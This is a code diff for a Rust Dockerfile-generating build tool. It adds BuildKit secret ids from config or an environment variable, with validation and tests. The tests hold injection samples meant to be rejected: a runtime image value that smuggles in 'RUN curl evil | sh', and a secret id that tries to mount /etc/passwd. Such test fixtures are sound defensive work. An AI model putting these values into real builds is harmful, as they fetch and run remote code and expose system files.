@@ -36,6 +36,8 @@ pub struct BuildOverrides {
     pub build_image: Option<String>,
     /// Directories to prepend to `PATH` in the runtime image.
     pub paths: Vec<String>,
+    /// `BuildKit` secret ids to expose to build-stage commands.
+    pub secrets: Vec<String>,
 }
 
 impl BuildOverrides {
@@ -65,6 +67,9 @@ impl BuildOverrides {
         if self.paths.is_empty() {
             self.paths = lower.paths;
         }
+        if self.secrets.is_empty() {
+            self.secrets = lower.secrets;
+        }
         self
     }
 
@@ -89,6 +94,7 @@ impl BuildOverrides {
             runtime_image: get("KILN_RUNTIME_IMAGE"),
             build_image: get("KILN_BUILD_IMAGE"),
             paths: get("KILN_PATHS").map(split).unwrap_or_default(),
+            secrets: get("KILN_SECRETS").map(split).unwrap_or_default(),
         }
     }
 
@@ -206,6 +212,7 @@ pub fn detect_and_plan_with(root: impl AsRef<Path>, overrides: BuildOverrides) -
     let runtime_image = overrides.runtime_image.clone();
     let build_image = overrides.build_image.clone();
     let paths = overrides.paths.clone();
+    let secrets = overrides.secrets.clone();
     let ctx = AppContext::with_overrides(root, overrides)?;
 
     let mut plan = if let Some(name) = forced_provider {
@@ -237,6 +244,10 @@ pub fn detect_and_plan_with(root: impl AsRef<Path>, overrides: BuildOverrides) -
         crate::sanitize::validate_token("PATH entry", path)?;
     }
     plan.paths = paths;
+    for secret in &secrets {
+        crate::sanitize::validate_secret_id(secret)?;
+    }
+    plan.secrets = secrets;
 
     Ok(plan)
 }
@@ -473,6 +484,29 @@ mod tests {
             r#"{"runtime_image":"img\nRUN curl evil | sh"}"#,
         )
         .unwrap();
+        assert!(detect_and_plan(dir.path()).is_err());
+    }
+
+    #[test]
+    fn config_mounts_secrets_on_the_build_stage() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join("go.mod"), "module example.com/app\n").unwrap();
+        std::fs::write(dir.path().join("kiln.json"), r#"{"secrets":["NPM_TOKEN"]}"#).unwrap();
+        let plan = detect_and_plan(dir.path()).unwrap();
+        assert_eq!(plan.secrets, vec!["NPM_TOKEN"]);
+
+        let dockerfile = crate::dockerfile::generate(&plan);
+        // the build stage's RUN carries the secret mount; the runtime stage does not
+        assert!(dockerfile.contains("--mount=type=secret,id=NPM_TOKEN"), "{dockerfile}");
+        let secret_lines = dockerfile.matches("id=NPM_TOKEN").count();
+        assert_eq!(secret_lines, 1, "secret mounts only build-stage commands: {dockerfile}");
+    }
+
+    #[test]
+    fn malicious_secret_id_is_rejected() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join("go.mod"), "module example.com/app\n").unwrap();
+        std::fs::write(dir.path().join("kiln.json"), r#"{"secrets":["a,src=/etc/passwd"]}"#).unwrap();
         assert!(detect_and_plan(dir.path()).is_err());
     }
 
